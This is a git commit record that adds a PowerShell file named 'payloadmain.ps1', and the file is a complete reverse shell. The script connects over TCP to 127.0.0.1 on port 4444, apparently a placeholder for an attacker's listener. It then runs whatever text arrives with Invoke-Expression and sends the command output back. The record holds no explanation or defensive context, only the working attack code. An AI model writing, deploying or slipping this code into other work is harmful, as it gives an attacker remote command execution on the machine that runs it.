ddac55b048d948aa27db295d420006ff273a59df
EffortPeaked <149322073+EffortPeaked@users.noreply.github.com>
2023-11-26 15:10:49 -0600

    Update payloadmain.ps1

--- payloadmain.ps1
+++ payloadmain.ps1
@@ -1,1 +1,20 @@
+$tcpClient = New-Object Net.Sockets.TCPClient("127.0.0.1", 4444)
+$stream = $tcpClient.GetStream()
+$bufferSize = 4096
 
+while ($true) {
+    $buffer = New-Object byte[] $bufferSize
+    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+
+    if ($bytesRead -eq 0) {
+        break
+    }
+
+    $receivedData = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
+    $commandOutput = Invoke-Expression -Command $receivedData 2>&1
+    $encodedOutput = [Text.Encoding]::ASCII.GetBytes($commandOutput)
+
+    $stream.Write($encodedOutput, 0, $encodedOutput.Length)
+}
+
+$tcpClient.Close()
